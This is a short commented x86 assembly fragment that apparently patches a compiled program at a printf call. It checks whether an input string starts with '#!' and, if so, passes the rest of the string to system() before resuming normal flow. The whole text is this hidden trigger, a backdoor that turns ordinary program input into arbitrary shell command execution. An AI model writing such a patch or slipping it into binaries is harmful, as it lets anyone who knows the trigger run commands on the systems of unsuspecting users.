jmp 0x59 # jmp after nops 
push ebx

movzx ebx, byte ptr[eax]
cmp ebx,0x23 # check if 1st char is #
jne no_execute # jmp to the code 

inc eax
movzx ebx, byte ptr[eax]
cmp ebx,0x21 # check if 2st char is !
jne no_execute 

inc eax
push eax # eax + 2 (without #!)
call -0x16D # call system: -(0x5CD-0x460)
pop ebx
jmp 0x81 # back to after printf: 0x64E-0x5CD

no_execute:
pop ebx
jmp 0x6D # back to before printf: 0x63A-0x5CD

